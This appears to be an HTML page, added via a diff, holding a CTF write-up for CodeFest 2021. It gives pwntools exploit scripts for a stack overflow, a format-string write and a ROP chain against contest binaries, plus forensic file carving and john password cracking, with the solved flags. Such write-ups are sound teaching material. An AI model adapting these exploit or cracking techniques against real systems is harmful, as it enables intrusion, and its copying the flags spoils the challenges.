@@ -1,0 +1,201 @@
+<html>
+	<head>
+	<meta charset="UTF-8">
+	<meta name="description" content="quackland.tk - under construction">
+	<meta name="author" content="quackland.tk">
+	<link rel="stylesheet" href="/styles/dracula.css">
+	<script src="/js/highlight.pack.js"></script>
+	<script>hljs.highlightAll();</script>
+	<title>quackland.kr</title>
+
+	<style type="text/css">
+		body {
+			background-color:black;
+			color:white;
+			font-family:hack;
+			padding-left: 137px;
+			padding-right: 137px;
+		}
+		h1 {
+			font-size: 40px;
+			color:#81cc4b;
+			text-align: center;
+		}
+		h2 {
+			font-size: 30px;
+			color:#81cc4b;
+		}
+		a { color: white; }
+		.hello {
+			position: fixed;
+			top: 50%;
+			left: 50%;
+			transform: translate(-50%, -50%);
+		}
+		.fading {
+			animation:fading 7s infinite
+		}
+		@keyframes fading{
+			0%{opacity:0}
+			50%{opacity:1}
+			100%{opacity:0}
+		}
+	</style>
+</head>
+<body>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="description" content="quackland.tk - under construction">
+<meta name="author" content="quackland.tk">
+<link rel="stylesheet" href="/styles/dracula.css">
+<script src="/js/highlight.pack.js"></script>
+<script>hljs.highlightAll();</script>
+<title>
+quackland.kr
+</title>
+<style type="text/css">
+        body {
+            background-color:black;
+            color:white;
+            font-family:hack;
+            padding-left: 137px;
+            padding-right: 137px;
+        }
+        h1 {
+            font-size: 40px;
+            color:#81cc4b;
+            text-align: center;
+        }
+        h2 {
+            font-size: 30px;
+            color:#81cc4b;
+        }
+        a { color: white; }
+        .hello {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        .fading {
+            animation:fading 7s infinite
+        }
+        @keyframes fading{
+            0%{opacity:0}
+            50%{opacity:1}
+            100%{opacity:0}
+        }
+    </style>
+</head>
+<body>
+<h1 id="writeup-for-codefest">WriteUp for CodeFest</h1>
+<h6 id="tags-pwn-ctf-easy-beginner">tags: <code>pwn</code> <code>ctf</code> <code>easy</code> <code>beginner</code></h6>
+<p>These will include the challenges I was able to do in the last 2 hours of the 24 hour ctf @ CodeFest 2021. I was able to solve the entire pwn category which was easy and beginner friendly and one forensics challenge which was very practical and straight-forward.</p>
+<h1 id="pwn-category">Pwn Category</h1>
+<h2 id="c-is-hard">C is Hard</h2>
+<h4 id="download-files-from-here"><a href="https://github.com/not-duckie/RandomPwn/tree/master/ctf21/C_is_hard">Download files from here</a></h4>
+<p>This was the first challenge which has stack overflow vulnerability and the goal was to overflow the buf and call a hidden function called print_flag.</p>
+<p>Let’s start by analyzing the function in radare2.</p>
+<pre class="auto"><code>r2 -R&#39;stdin=input.txt&#39; ./source_fixed.</code></pre>
+<p><img src="https://i.imgur.com/4FEEWxS.png" /></p>
+<p>So our target is to go to the <code>sym.print_flag</code> as it will get us the flag. So how we can jump to the function. Lets start by analyzing the <code>sym.vuln</code> function.</p>
+<p><img src="https://i.imgur.com/VcWQQvr.png" /></p>
+<p>The function seems simple: we overflow the buffer s (i.e rbp-0x20 [check top of the function]). So after we give 0x20 bytes we will get to rbp and then rip. Thus our exploit will look like this:-</p>
+<div class="sourceCode" id="cb2"><pre class="python"><code class="python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>padding <span class="op">=</span> b<span class="st">&#39;i&#39;</span><span class="op">*</span><span class="bn">0x20</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>flag <span class="op">=</span> p64(<span class="bn">0x4011b6</span>)</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> padding</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> b<span class="st">&#39;A&#39;</span><span class="op">*</span><span class="bn">0x8</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> flag</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="co">#p = process(&#39;./source_fixed&#39;)</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> remote(<span class="st">&#39;chall.codefest.tech&#39;</span>,<span class="dv">8780</span>)</span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>p.recvline()</span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>p.sendline(payload)</span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>p.interactive()</span></code></pre></div>
+<p>and we get our first flag as:- codefest{overflowing_stacks_for_flags_and_fun_768999766}</p>
+<h2 id="take-me-to-cafe">Take Me to Cafe</h2>
+<h4 id="download-files-from-here-1"><a href="https://github.com/not-duckie/RandomPwn/tree/master/ctf21/take_me_to_cafe">Download files from here</a></h4>
+<p>This challenge is format string vulnerability in which we will have to overwrite a variable to value 0xcafe in order to get the flag and then finally go to the pawry(hidden joke in challenge :P).</p>
+<p>start by analyzing the function:-</p>
+<div class="sourceCode" id="cb3"><pre class="perl"><code class="perl"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>r2 <span class="ot">-R&#39;</span><span class="ss">stdin=input.txt</span><span class="ot">&#39;</span> .<span class="ot">/format</span></span></code></pre></div>
+<p><img src="https://i.imgur.com/hO4whEy.png" /></p>
+<p><img src="https://i.imgur.com/nmmVc7b.png" /></p>
+<p>We see that the function sym.print_flag is called if the <code>cmp eax, 0xcafe</code> is passed. So all we need to do is move the value 0xcafe to ebx+0x44 so it is moved to eax and then we pass the cmp and get the flag.</p>
+<p>The vulnerability as hinted by the binary name and the confirmed from the source code is format string. With this we can write any value to any address with the help of %n parameter.</p>
+<p>%n basically write the number of bytes printed to screen so far to a given address.</p>
+<p>Let’s start by determining where our first argument lands on the stack. Send the input</p>
+<div class="sourceCode" id="cb4"><pre class="perl"><code class="perl"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>aaaabbbbcccc<span class="dt">%lx</span> <span class="dt">%lx</span>...</span></code></pre></div>
+<p>repeat the %lx until you see the aaaa in hex.</p>
+<p><img src="https://i.imgur.com/wj92pSQ.png" /></p>
+<p>we see that our aaaa lands as the 4th argument on the stack. Confirm it by testing it again.</p>
+<p><img src="https://i.imgur.com/M36tQuF.png" /></p>
+<p>Now all we need to overwrite the cmp to pass it and get the flag shown we found earlier. Thus the exploit will look like this.</p>
+<p>The exploit basically writes a number to a given address that is 0x804c044. It takes some hit and trial to find the correct value to write but start with int(0xcafe) and adjust accordingly.</p>
+<div class="sourceCode" id="cb5"><pre class="python"><code class="python"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>padding <span class="op">=</span> b<span class="st">&#39;i&#39;</span><span class="op">*</span><span class="dv">88</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>addr <span class="op">=</span> p32(<span class="bn">0x804c044</span>)</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> addr <span class="op">+</span> b<span class="st">&quot;</span><span class="sc">%51962d</span><span class="st">%4$hn&quot;</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a><span class="co">#p = process(&#39;./format&#39;)</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> remote(<span class="st">&#39;chall.codefest.tech&#39;</span>,<span class="dv">8744</span>)</span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(p.recvuntil(<span class="st">&#39;will go</span><span class="ch">\n</span><span class="st">&#39;</span>))</span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>p.sendline(payload)</span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a>p.interactive()</span></code></pre></div>
+<p>And we get the flag along with the meme reference. <img src="https://i.imgur.com/DHieiRo.png" /></p>
+<h2 id="welcome-to-the-pawry">Welcome to the Pawry</h2>
+<p>Welcome the pawry is a simple rop challenge. We get a buffer overflow, string in binary “/bin/cat flag.txt” and system call and we need to create a rop chain to get the flag.</p>
+<p>The challenge is straightforward so the exploit should be self explanatory.</p>
+<div class="sourceCode" id="cb6"><pre class="python"><code class="python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="co"># 24 + ebp + eip</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>padding <span class="op">=</span> b<span class="st">&#39;i&#39;</span><span class="op">*</span><span class="dv">28</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>binCat <span class="op">=</span> p32(<span class="bn">0x804c028</span>)</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>system_call <span class="op">=</span> p32(<span class="bn">0x8049214</span>)</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> padding <span class="op">+</span> system_call <span class="op">+</span> binCat</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a>p <span class="op">=</span> process(<span class="st">&#39;./pawry&#39;</span>)</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="co">#p = remote(&#39;chall.codefest.tech&#39;,8686)</span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>p.recvuntil(<span class="st">&#39;.&#39;</span>)</span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a>p.sendline(payload)</span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>p.interactive()</span></code></pre></div>
+<h1 id="forensics">Forensics</h1>
+<h2 id="anime-is-love-3">Anime is Love &lt;3</h2>
+<h4 id="download-files-from-here-2"><a href="https://github.com/not-duckie/RandomPwn/tree/master/ctf21/animeIsLove">Download files from here</a></h4>
+<p>This was a good forensics challenge that required a little bit of manual work. I liked it alot. The challenge starts with the given prompt.</p>
+<p><img src="https://i.imgur.com/GjtltNN.png" /></p>
+<p>So start by analyzing the hexdump of the image and find that there is flag.txt at the end of the image.</p>
+<p><img src="https://i.imgur.com/nFL08k5.png" /></p>
+<p>So let’s extract it. The jpg files usually end with FFD9 byte. We extract everything after that in file called foo.</p>
+<div class="sourceCode" id="cb7"><pre class="perl"><code class="perl"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>dd <span class="kw">if</span>=anime.jpg of=tmp bs=<span class="dv">1</span> skip=<span class="dv">362196</span></span></code></pre></div>
+<p>Here skip the address of the line where we found the ending byte in int (0x586D4).</p>
+<h6 id="note">Note</h6>
+<div class="sourceCode" id="cb8"><pre class="perl"><code class="perl"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>i am using ghex <span class="ot">and</span> <span class="kw">my</span> <span class="fu">hex</span> editor.</span></code></pre></div>
+<p><img src="https://i.imgur.com/TATw0ud.png" /></p>
+<p>After cleaning up the file by removing extra bytes that may have been copied and fixing the magic byte of the zip file (i.e 50 4B). And we have a clean zip file.</p>
+<p>When we try to open it we find it has a password protection. So convert it to hash and brute force it with john.</p>
+<div class="sourceCode" id="cb9"><pre class="bash"><code class="bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">zip2john</span> tmp.zip <span class="op">&gt;</span> hash</span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">john</span> <span class="at">--wordlist</span><span class="op">=</span>~/rockyou.txt hash</span></code></pre></div>
+<p>We find the password as dragonballz. But the picture was of naruto ? wtf.</p>
+<p>The flag.txt is a pdf file which when opened with the viewer opens weird. So lets repair it with foremost and try it again.</p>
+<div class="sourceCode" id="cb10"><pre class="bash"><code class="bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">foremost</span> flag.txt</span></code></pre></div>
+<p>Now when it opens it, it asks for a password.</p>
+<div class="sourceCode" id="cb11"><pre class="bash"><code class="bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pdf2john</span> 00000.pdf <span class="op">&gt;</span> hash</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ex">john</span> <span class="at">--wordlist</span><span class="op">=</span>~/rockyou.txt hash</span></code></pre></div>
+<p>The password is naruto and we get the flag.</p>
+codefest{y0u_4r3_g00d_4t_m4g1c_byt35}
+</body>
+</html></body>
+</html>
